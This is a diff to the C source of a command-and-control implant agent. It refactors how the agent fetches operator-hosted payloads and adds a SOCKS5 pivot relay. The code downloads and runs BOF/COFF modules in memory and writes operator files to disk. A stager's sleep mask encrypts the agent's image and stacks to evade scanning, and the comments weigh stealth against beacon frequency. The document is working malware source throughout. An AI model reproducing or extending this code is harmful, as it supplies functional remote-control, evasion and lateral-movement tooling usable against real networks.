@@ -35,10 +35,8 @@
 #if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
 #include "bof.h"
 #endif
-#if C2_AGENT_ENABLE_BOF
 #include "bof_host.h"
-#endif
-#include "file_transfer.h"
+#include "fetch.h"
 #if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
 #include "module.h"
 #endif
@@ -152,11 +150,20 @@ static void obuf_append(obuf *b, const char *s, size_t n) {
  * Idle between C2 lifecycles. The stager owns the mask and publishes its entry
  * point beside the agent; the call runs on this thread after the image has been
  * made writable and XORed. If no mask stub was installed, a supervising parent
- * can reclaim the process instead. The agent has no worker threads of its own;
- * any future worker must be joined before this point, because nothing may run
- * agent code while the image is masked.
+ * can reclaim the process instead.
+ *
+ * The mask encrypts the agent image, its heap and every thread stack, so no
+ * other thread may execute agent code while it is applied. A SOCKS5 relay
+ * manager outlives the BOF that started it, so the mask waits until the last
+ * manager is joined and no host call is in flight; until then the agent sleeps
+ * like a plain process.
  */
 static void agent_sleep(const c2_agent_config *cfg, unsigned secs) {
+  if (c2_bof_work_quiesce() != 0) {
+    struct timespec busy = {(time_t)secs, 0};
+    nanosleep(&busy, NULL);
+    return;
+  }
   /* The stager publishes the mask next to the agent. Use it whenever it is
    * present, even if an older embedded config forgot to set IsRunByStager;
    * a standalone agent has no valid GS block, so bind simply fails. */
@@ -455,63 +462,57 @@ static void run_cat(const char *path, obuf *out) {
   fclose(f);
 }
 
-/* `download <name>`: fetch over the www route and cache in memfs (transparent
- * gzip + AES-GCM), mirroring the Go agent's DownloadViaC2 + cacheToMemFS. */
-static void run_download(c2_agent_session *s, c2_memfile *mem, const char *name,
-                         obuf *out) {
-  size_t cap = 16u * 1024u * 1024u;
-  uint8_t *buf = (uint8_t *)malloc(cap);
-  if (buf == NULL) {
-    obuf_append(out, "download failed\n", 16);
-    return;
-  }
-  size_t len = 0;
-  c2_status st =
-      c2_session_download(s, c2_str_of(name, strlen(name)), buf, cap, &len);
-  if (st == C2_OK && len == 0)
-    st = C2_ERR_PROTO; /* the C2 refused or could not serve it: no bytes */
-  if (st == C2_OK) {
-    char key[512];
-    size_t kl = c2_memfile_key(name, strlen(name), key, sizeof(key));
-    st =
-        kl ? c2_memfile_write(mem, c2_str_of(key, kl), buf, len) : C2_ERR_NOMEM;
-  }
-  free(buf);
-  obuf_append(out, st == C2_OK ? "downloaded\n" : "download failed\n",
-              st == C2_OK ? 11 : 16);
-}
-
-/* `put --file <name> --path <dest> --checksum <sha256>`: fetch an
- * operator-registered file over the www route and write it to `dest`, verifying
- * the digest once the transfer completes. This is the same download primitive a
- * module payload uses, so an operator upload needs no BOF. */
-static void run_put(c2_agent_session *s, c2_memfile *mem,
-                    const c2_str_list *cmd, obuf *out) {
+/* The single C2 -> agent delivery path.
+ *
+ * `download <name>` caches a hosted file in memfs; `put --file <name> --path
+ * <dest> --checksum <sha256>` is the same fetch with a destination and a digest
+ * to verify. Module payloads and dependency images go through the same helper,
+ * so every byte the C2 sends the agent arrives one way. */
+static void run_download(c2_agent_session *s, c2_memfile *mem,
+                         const c2_str_list *cmd, obuf *out) {
   char file[512] = "";
-  char dest[512] = "";
-  char checksum[128] = "";
   c2_cmd_pick_flag(cmd, "--file", file, sizeof(file));
-  c2_cmd_pick_flag(cmd, "--path", dest, sizeof(dest));
-  c2_cmd_pick_flag(cmd, "--checksum", checksum, sizeof(checksum));
-  if (file[0] == '\0' || dest[0] == '\0') {
-    static const char msg[] = "upload failed: missing file or path\n";
+  if (file[0] == '\0')
+    c2_cmd_argn(cmd, 1, file, sizeof(file));
+  if (file[0] == '\0') {
+    static const char msg[] = "download failed: missing file\n";
     obuf_append(out, msg, sizeof(msg) - 1);
     return;
   }
 
-  char got[65] = {0};
+  /* No destination means the memfs cache key of the hosted name, which is where
+   * a payload the agent later loads is expected to live. */
+  char dest[512] = "";
+  c2_cmd_pick_flag(cmd, "--path", dest, sizeof(dest));
+  if (dest[0] == '\0' &&
+      c2_memfile_key(file, strlen(file), dest, sizeof(dest)) == 0) {
+    static const char msg[] = "download failed: bad name\n";
+    obuf_append(out, msg, sizeof(msg) - 1);
+    return;
+  }
+  int memfs_dest = c2_memfile_is_path(dest);
+
+  char checksum[128] = "";
+  c2_cmd_pick_flag(cmd, "--checksum", checksum, sizeof(checksum));
+
+  char got[C2_SHA256_BYTES * 2 + 1] = {0};
   char err[192] = {0};
-  c2_status st = c2_agent_put_file(s, mem, file, dest, checksum, got,
-                                   sizeof(got), err, sizeof(err));
+  c2_status st = c2_deliver_file(s, mem, c2_str_of(file, strlen(file)), dest,
+                                 checksum, got, sizeof(got), err, sizeof(err));
   if (st != C2_OK) {
-    char msg[256];
-    int n = snprintf(msg, sizeof(msg), "upload failed: %s: %s\n", dest,
+    char msg[288];
+    int n = snprintf(msg, sizeof(msg), "%s failed: %s: %s\n",
+                     memfs_dest ? "download" : "upload", dest,
                      err[0] != '\0' ? err : c2_status_str(st));
     if (n > 0)
       obuf_append(out, msg, (size_t)n);
     return;
   }
 
+  if (memfs_dest) {
+    obuf_append(out, "downloaded\n", 11);
+    return;
+  }
   char msg[320];
   int n = snprintf(msg, sizeof(msg), "%s uploaded, sha256sum: %s\n", dest, got);
   if (n > 0)
@@ -587,29 +588,14 @@ static c2_status ensure_dependency(c2_agent_session *s, c2_memfile *mem,
   int n = snprintf(name, sizeof(name), "%s.%s.gz", module, c2_arch_name());
   if (n < 0 || (size_t)n >= sizeof(name))
     return C2_ERR_NOMEM;
-  size_t gz_cap = 8u * 1024u * 1024u;
-  uint8_t *gz = (uint8_t *)malloc(gz_cap);
-  if (gz == NULL)
-    return C2_ERR_NOMEM;
-  size_t gz_len = 0;
-  c2_status st =
-      c2_session_download(s, c2_str_of(name, (size_t)n), gz, gz_cap, &gz_len);
-  if (st != C2_OK) {
-    free(gz);
-    return st;
-  }
 
-  size_t so_cap = 16u * 1024u * 1024u;
-  uint8_t *so = (uint8_t *)malloc(so_cap);
-  if (so == NULL) {
-    free(gz);
-    return C2_ERR_NOMEM;
-  }
+  /* The C2 hashes the payload image, not the archive it hosts, so the digest is
+   * checked after unwrapping. */
+  uint8_t *so = NULL;
   size_t so_len = 0;
-  st = c2_gzip_decompress(gz, gz_len, so, so_cap, &so_len);
-  free(gz);
-  if (st == C2_OK && !dependency_matches(s, so, so_len, checksum))
-    st = C2_ERR_CRYPTO;
+  c2_status st = c2_fetch_payload(s, c2_str_of(name, (size_t)n), checksum, 1,
+                                  8u * 1024u * 1024u, 16u * 1024u * 1024u, &so,
+                                  &so_len, NULL, 0);
   if (st == C2_OK)
     st = c2_memfile_write(mem, c2_str_of(key, (size_t)key_len), so, so_len);
   free(so);
@@ -653,8 +639,10 @@ static void execute_bof(c2_agent_session *s, c2_memfile *mem,
   char *result = NULL;
   c2_status st = C2_OK;
   c2_bof_host_ctx host_ctx = {s, mem};
-  c2_bof_host host = {&host_ctx, c2_bof_host_read, c2_bof_host_write,
-                      c2_bof_host_upload, c2_bof_host_sha256};
+  c2_bof_host host = {&host_ctx,          c2_bof_host_read,
+                      c2_bof_host_write,  c2_bof_host_upload,
+                      c2_bof_host_sha256, c2_bof_host_relay,
+                      c2_bof_host_exec};
   if (packed == NULL) {
     st = C2_ERR_NOMEM;
   } else if (tokenc > 0) {
@@ -743,8 +731,10 @@ static void execute_rv(c2_agent_session *s, c2_memfile *mem,
 
   char *result = NULL;
   c2_bof_host_ctx host_ctx = {s, mem};
-  c2_bof_host host = {&host_ctx, c2_bof_host_read, c2_bof_host_write,
-                      c2_bof_host_upload, c2_bof_host_sha256};
+  c2_bof_host host = {&host_ctx,          c2_bof_host_read,
+                      c2_bof_host_write,  c2_bof_host_upload,
+                      c2_bof_host_sha256, c2_bof_host_relay,
+                      c2_bof_host_exec};
   c2_status st = c2_rv_run(loader, loader_len, image, image_len, bof_args,
                            bof_len, &host, &result);
   if (st == C2_OK && result != NULL) {
@@ -762,7 +752,138 @@ static void execute_rv(c2_agent_session *s, c2_memfile *mem,
 }
 #endif /* C2_AGENT_ENABLE_RVVM */
 
+/* The poll loop's configuration. `!proxy_tune` adjusts it at runtime while a
+ * SOCKS5 pivot is bound; the loop re-reads interval and window every cycle. */
+static c2_agent_config *g_poll_cfg;
+/* Set by `!proxy_tune`: the C2 learns the new poll profile (and its derived
+ * removal deadline) only from a check-in. */
+static int *g_need_checkin;
+static int32_t g_pivot_saved_interval;
+static int32_t g_pivot_saved_window;
+static int g_pivot_tuned;
+
+/* `!proxy_tune --mode on --interval N --window M` / `--mode off`: a SOCKS5 pivot
+ * needs the agent to pick commands up quickly, so the C2 asks it to poll more
+ * often and hold its message window open longer while the pivot lives. This
+ * costs stealth: the agent stays unmasked and beacons far more often. The
+ * agent saves its own profile once and restores it on --mode off, so a stopped
+ * pivot leaves the configured beacon timing untouched. */
+static void run_proxy_tune(const c2_str_list *cmd, obuf *out) {
+  if (g_poll_cfg == NULL) {
+    obuf_append(out, "proxy_tune: no poll profile\n", 29);
+    return;
+  }
+  char mode[16] = "";
+  c2_cmd_pick_flag(cmd, "--mode", mode, sizeof(mode));
+  if (strcmp(mode, "off") == 0) {
+    if (g_pivot_tuned) {
+      g_poll_cfg->poll_interval = g_pivot_saved_interval;
+      g_poll_cfg->poll_window = g_pivot_saved_window;
+      g_pivot_tuned = 0;
+      if (g_need_checkin != NULL)
+        *g_need_checkin = 1;
+    }
+    obuf_append(
+        out, "proxy_tune: restored the configured interval and window\n", 53);
+    return;
+  }
+  if (strcmp(mode, "on") != 0) {
+    obuf_append(out, "proxy_tune: --mode must be on or off\n", 37);
+    return;
+  }
+  if (!g_pivot_tuned) {
+    g_pivot_saved_interval = g_poll_cfg->poll_interval;
+    g_pivot_saved_window = g_poll_cfg->poll_window;
+    g_pivot_tuned = 1;
+  }
+  char value[16] = "";
+  c2_cmd_pick_flag(cmd, "--interval", value, sizeof(value));
+  int interval = atoi(value);
+  if (interval > 0 && interval <= 3600)
+    g_poll_cfg->poll_interval = (int32_t)interval;
+  value[0] = '\0';
+  c2_cmd_pick_flag(cmd, "--window", value, sizeof(value));
+  int window = atoi(value);
+  if (window > 0 && window <= 3600)
+    g_poll_cfg->poll_window = (int32_t)window;
+  if (g_need_checkin != NULL)
+    *g_need_checkin = 1;
+  char msg[96];
+  int n =
+      snprintf(msg, sizeof(msg), "proxy_tune: interval=%d window=%d\n",
+               (int)g_poll_cfg->poll_interval, (int)g_poll_cfg->poll_window);
+  if (n > 0)
+    obuf_append(out, msg, (size_t)n);
+}
+
 #if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
+/* `!proxy_start --token <t> --target <host:port>`: the C2's SOCKS5 listener
+ * asks this agent to serve one pivot connection. A Go agent has the relay
+ * built in; this agent runs the socks5 BOF the C2 hosted when the operator ran
+ * socks_start. Fetch it once (memfs cache), then run it with the token and the
+ * target: the BOF dials the target, opens the proxy stream and relays. */
+static void run_proxy_start(c2_agent_session *s, c2_memfile *mem,
+                            const c2_str_list *cmd, obuf *out) {
+  char token[128] = "";
+  char target[256] = "";
+  c2_cmd_pick_flag(cmd, "--token", token, sizeof(token));
+  c2_cmd_pick_flag(cmd, "--target", target, sizeof(target));
+  if (token[0] == '\0' || target[0] == '\0') {
+    obuf_append(out, "proxy_start: --token and --target are required\n", 46);
+    return;
+  }
+
+  uint8_t *bof = NULL;
+  size_t bof_len = 0;
+  /* The hosted archive carries no per-connection checksum; the session that
+   * fetches it is already authenticated and encrypted. */
+  if (ensure_dependency(s, mem, "socks5", NULL) != C2_OK ||
+      load_dependency(mem, "socks5", &bof, &bof_len) != C2_OK) {
+    obuf_append(out, "proxy_start: socks5 relay unavailable\n", 38);
+    return;
+  }
+
+  char token_arg[160];
+  char target_arg[300];
+  int n = snprintf(token_arg, sizeof(token_arg), "z%s", token);
+  int m = snprintf(target_arg, sizeof(target_arg), "z%s", target);
+  if (n <= 0 || (size_t)n >= sizeof(token_arg) || m <= 0 ||
+      (size_t)m >= sizeof(target_arg)) {
+    free(bof);
+    obuf_append(out, "proxy_start: argument too long\n", 30);
+    return;
+  }
+  c2_str args[2];
+  args[0] = c2_str_of(token_arg, (size_t)n);
+  args[1] = c2_str_of(target_arg, (size_t)m);
+
+#if defined(__x86_64__)
+#if C2_AGENT_ENABLE_BOF
+  execute_bof(s, mem, bof, bof_len, "go", args, 2, NULL, out);
+#else
+  obuf_append(out, "proxy_start: built without BOF support\n", 39);
+#endif
+#elif C2_AGENT_ENABLE_RVVM
+  size_t packed_cap = 4;
+  for (size_t i = 0; i < 2; i++)
+    packed_cap += 8 + args[i].len * 4;
+  uint8_t *packed = (uint8_t *)malloc(packed_cap);
+  size_t packed_len = 0;
+  if (packed == NULL ||
+      c2_bof_pack_args(args, 2, packed, packed_cap, &packed_len) != C2_OK) {
+    free(packed);
+    free(bof);
+    obuf_append(out, "proxy_start: out of memory\n", 27);
+    return;
+  }
+  execute_rv(s, mem, bof, bof_len, packed, packed_len, NULL, out);
+  free(packed);
+#else
+  obuf_append(out, "proxy_start: built without BOF support\n", 39);
+#endif
+  free(bof);
+}
+
 /* `!custom_module --mod_name X --type coff --file_to_download Y.gz
  *  --checksum <sha256> --invocation <base64 CBOR>`: the C2's module dispatch.
  * Download + verify + decompress the payload, decode the invocation, run the
@@ -808,58 +929,21 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
     return;
   }
 
-  size_t gz_cap = 32u * 1024u * 1024u;
-  uint8_t *gz = (uint8_t *)malloc(gz_cap);
-  if (gz == NULL) {
-    obuf_append(out, "custom_module: out of memory\n", 28);
-    free(invocation);
-    return;
-  }
-  size_t gz_len = 0;
-  c2_status st = c2_session_download(s, c2_str_of(file, strlen(file)), gz,
-                                     gz_cap, &gz_len);
-  if (st != C2_OK) {
-    TRACE("[agent] custom_module: download %s failed: %d\n", file, st);
-    obuf_append(out, "custom_module: download failed\n", 30);
-    free(gz);
-    free(invocation);
-    return;
-  }
-
-  if (checksum[0] != '\0') {
-    uint8_t digest[C2_SHA256_BYTES];
-    if (s->be->sha256 == NULL ||
-        s->be->sha256(s->be->ctx, gz, gz_len, digest) != 0) {
-      obuf_append(out, "custom_module: checksum unavailable\n", 35);
-      free(gz);
-      free(invocation);
-      return;
-    }
-    char hex[C2_SHA256_BYTES * 2 + 1];
-    c2_hex_encode(digest, sizeof(digest), hex);
-    hex[C2_SHA256_BYTES * 2] = '\0';
-    if (!c2_str_eq_ci(hex, checksum)) {
-      obuf_append(out, "custom_module: checksum mismatch\n", 32);
-      free(gz);
-      free(invocation);
-      return;
-    }
-  }
-
-  size_t obj_cap = 64u * 1024u * 1024u;
-  uint8_t *obj = (uint8_t *)malloc(obj_cap);
-  if (obj == NULL) {
-    obuf_append(out, "custom_module: out of memory\n", 28);
-    free(gz);
-    free(invocation);
-    return;
-  }
+  /* The C2 hashes the hosted archive, so the digest is checked before the
+   * payload is unwrapped. */
+  uint8_t *obj = NULL;
   size_t obj_len = 0;
-  st = c2_gzip_decompress(gz, gz_len, obj, obj_cap, &obj_len);
-  free(gz);
+  char fetch_err[128] = {0};
+  c2_status st = c2_fetch_payload(s, c2_str_of(file, strlen(file)), checksum, 0,
+                                  32u * 1024u * 1024u, 64u * 1024u * 1024u,
+                                  &obj, &obj_len, fetch_err, sizeof(fetch_err));
   if (st != C2_OK) {
-    obuf_append(out, "custom_module: decompress failed\n", 32);
-    free(obj);
+    TRACE("[agent] custom_module: fetch %s failed: %d\n", file, st);
+    char msg[192];
+    int n = snprintf(msg, sizeof(msg), "custom_module: %s\n",
+                     fetch_err[0] != '\0' ? fetch_err : "download failed");
+    if (n > 0)
+      obuf_append(out, msg, (size_t)n);
     free(invocation);
     return;
   }
@@ -1020,11 +1104,14 @@ static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
       run_cat(arg, out);
   } else if (cmd_eq(name, "mem_ls")) {
     run_mem_ls(mem, out);
-  } else if (cmd_eq(name, "download")) {
-    run_download(s, mem, arg, out);
-  } else if (cmd_eq(name, "put")) {
-    run_put(s, mem, &m->cmd_slice, out);
+  } else if (cmd_eq(name, "download") || cmd_eq(name, "put")) {
+    /* An operator upload is the module-payload fetch with a destination. */
+    run_download(s, mem, &m->cmd_slice, out);
+  } else if (cmd_eq(name, "proxy_tune")) {
+    run_proxy_tune(&m->cmd_slice, out);
 #if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
+  } else if (cmd_eq(name, "proxy_start")) {
+    run_proxy_start(s, mem, &m->cmd_slice, out);
   } else if (cmd_eq(name, "custom_module")) {
     run_custom_module(s, mem, &m->cmd_slice, out);
 #endif
@@ -1078,6 +1165,8 @@ __attribute__((visibility("default"))) int main(void) {
     return 1;
   }
   cfg.magic_string = magic;
+  /* !proxy_tune adjusts this same storage while a SOCKS5 pivot is bound. */
+  g_poll_cfg = &cfg;
   /* The stager maps a mask entry point beside the agent; probe it
    * unconditionally. Non-stager launches fail validation and keep normal
    * sleep behavior. */
@@ -1132,27 +1221,28 @@ __attribute__((visibility("default"))) int main(void) {
     TRACE("[agent] gather info failed: %d\n", st);
     return 1;
   }
-  /* Every agent decides its own removal deadline. The C2 never probes it
-   * while the agent sleeps; it keeps the record until this deadline. */
-  {
-    int64_t grace = cfg.offline_grace;
-    if (grace <= 0) {
-      int32_t window =
-          cfg.poll_window > 0 ? cfg.poll_window : C2_DEFAULT_POLL_WINDOW;
-      unsigned interval = c2_poll_interval_seconds(&cfg);
-      grace = (int64_t)interval + window + interval / 2;
-    }
-    info.has_offline_grace = 1;
-    info.offline_grace = grace;
-  }
-
   /* Check in once, then beacon on the message route. A short read window
    * means an idle agent closes the tunnel and masks instead of being pinned
    * by the C2's 35-70s HTTP long-poll. Commands issued while it sleeps are
    * queued by the C2 and delivered by the next hello. */
   int need_checkin = 1;
+  g_need_checkin = &need_checkin;
   for (;;) {
     if (need_checkin) {
+      /* Every agent decides its own removal deadline. The C2 never probes it
+       * while the agent sleeps; it keeps the record until this deadline. It is
+       * recomputed from the current profile so a pivot tuning is reported. */
+      {
+        int64_t grace = cfg.offline_grace;
+        if (grace <= 0) {
+          int32_t window =
+              cfg.poll_window > 0 ? cfg.poll_window : C2_DEFAULT_POLL_WINDOW;
+          unsigned interval = c2_poll_interval_seconds(&cfg);
+          grace = (int64_t)interval + window + interval / 2;
+        }
+        info.has_offline_grace = 1;
+        info.offline_grace = grace;
+      }
       if ((st = c2_session_checkin(&s, &info)) != C2_OK) {
         TRACE("[agent] checkin failed: %d\n", st);
         agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
